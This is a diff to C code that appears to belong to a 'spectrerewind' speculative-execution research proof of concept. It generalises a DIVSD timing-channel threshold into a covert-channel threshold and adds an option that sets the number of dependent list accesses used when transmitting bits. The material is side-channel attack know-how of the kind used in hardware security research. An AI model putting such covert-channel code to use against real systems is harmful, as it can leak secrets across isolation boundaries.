@@ -47,7 +47,7 @@
  * Public Types
  **************************************************************************/
 typedef struct {
-  size_t divsd_threshold; /**< threshold in cycles for the DIVSD channel */
+  size_t threshold; /**< threshold in cycles for the SPR covert channel */
 } libkdump_config_t;
   
 /**************************************************************************
@@ -59,6 +59,7 @@ static libkdump_config_t config;
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 static pthread_t count_thread;
 static int g_bp_depth = 9;
+static int g_list_acc = 12;
 
 /**************************************************************************
  * Public Function Prototypes
@@ -161,14 +162,14 @@ void __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
   int my_mul = dt->mul;
   
   int next = start;
-  for (int i = 0; i < 12; i++) {
+  for (int i = 0; i < g_list_acc; i++) {
     next = linked[next][256];
   }
   
   if( 0 != (next * my_mul) ) {
     if ( *ptr & (1 << bit_no) ) {
       int next2 = start;
-      for (int i = 0; i < 12; i++) {
+      for (int i = 0; i < g_list_acc; i++) {
 	my_out[i] = linked[next2][256]; //  prefetching
 	next2 = random_data[next2]; // random_data is in cache
       }
@@ -216,9 +217,9 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
   linked[0][256] = next;
   while( next != 0 )
   {
-      int current = next;
-      next = random_data[current];
-      linked[current][256] = next;
+    int current = next;
+    next = random_data[current];
+    linked[current][256] = next;
   }
 
   start = 0;
@@ -269,19 +270,19 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
   }
   
   if (total[1][N_TESTS*99/100] < total[0][N_TESTS*1/100]) {
-    config.divsd_threshold = (total[1][N_TESTS*99/100] + total[0][N_TESTS*1/100])/2;
+    config.threshold = (total[1][N_TESTS*99/100] + total[0][N_TESTS*1/100])/2;
   } else {
-    config.divsd_threshold = (total[1][N_TESTS/2] + total[0][N_TESTS/2])/2;
+    config.threshold = (total[1][N_TESTS/2] + total[0][N_TESTS/2])/2;
   }
-  debug(SUCCESS, "spectrerewind: divsd ch threshold: %d cycles\n", config.divsd_threshold);
+  debug(SUCCESS, "spectrerewind: covert ch threshold: %d cycles\n", config.threshold);
 
   int err0_cnt = -1, err1_cnt = -1;
   for (int j = 0; j < N_TESTS; j++) {
-    if (err0_cnt == -1 && total[0][j] > config.divsd_threshold) {
+    if (err0_cnt == -1 && total[0][j] > config.threshold) {
       debug(INFO, "0 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
       err0_cnt = j;
     }
-    if (err1_cnt == -1 && total[1][N_TESTS-j-1] <= config.divsd_threshold) {
+    if (err1_cnt == -1 && total[1][N_TESTS-j-1] <= config.threshold) {
       debug(INFO, "1 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
       err1_cnt = j;
     }
@@ -303,14 +304,18 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
 int main(int argc, char *argv[])
 {
   int opt;
-  while ((opt = getopt(argc, argv, "b:")) != -1) {
+  while ((opt = getopt(argc, argv, "b:l:")) != -1) {
     switch(opt) {
     case 'b': /* # iterations need to mistrain the branch predictor */
       g_bp_depth = strtol(optarg, NULL, 0);
       break;
+    case 'l': /* # dependent list accesses */
+      g_list_acc = strtol(optarg, NULL, 0);
+      break;
     }
   }
   debug(INFO, "BP training depth: %d\n", g_bp_depth);
+  debug(INFO, "# list accesses: %d\n", g_list_acc);
   
   if (setpriority(PRIO_PROCESS, 0, -20) < 0) {
     debug(ERROR, "priority -20 failed\n");
